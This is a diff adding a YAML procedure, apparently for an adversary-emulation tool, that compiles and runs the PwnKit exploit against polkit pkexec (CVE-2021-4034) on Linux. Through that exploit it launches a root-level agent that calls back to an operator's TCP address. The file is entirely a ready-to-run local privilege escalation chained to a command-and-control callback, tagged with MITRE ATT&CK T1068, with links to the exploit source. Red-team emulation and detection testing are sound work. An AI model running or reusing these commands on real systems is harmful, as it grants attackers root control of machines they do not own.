@@ -1,0 +1,26 @@
+id: d43a4a1e-1134-4853-9fc7-39bcc181e85c
+name: Spawn elevated Pneuma via CVE-2021-4034
+description: Compiles and executes a local privilege escalation exploit (CVE-2021-4034) to spawn a root shell.
+tactic: privilege-escalation
+technique:
+  id: T1068
+  name: 'Exploitation for Privilege Escalation'
+platforms:
+  linux:
+    sh:
+      command: |-
+        cp "./blasty-vs-pkexec.c" /tmp/blasty-vs-pkexec.c
+        gcc blasty-vs-pkexec.c -o /tmp/blasty-vs-pkexec
+        chmod +x /tmp/blasty-vs-pkexec
+        echo 'nohup #{agent.location} -address #{operator.tcp} -range elevated >/dev/null 2>&1 &' | /tmp/blasty-vs-pkexec
+      payload: '#{operator.payloads}/CVE-2021-4034/blasty-vs-pkexec.c'
+metadata:
+  authors:
+    - VVX7
+  chains:
+    - LPE in polkit (CVE-2021-4034)
+  references:
+    - https://twitter.com/bl4sty
+    - https://haxx.in/files/blasty-vs-pkexec.c
+    - https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+  tags: []
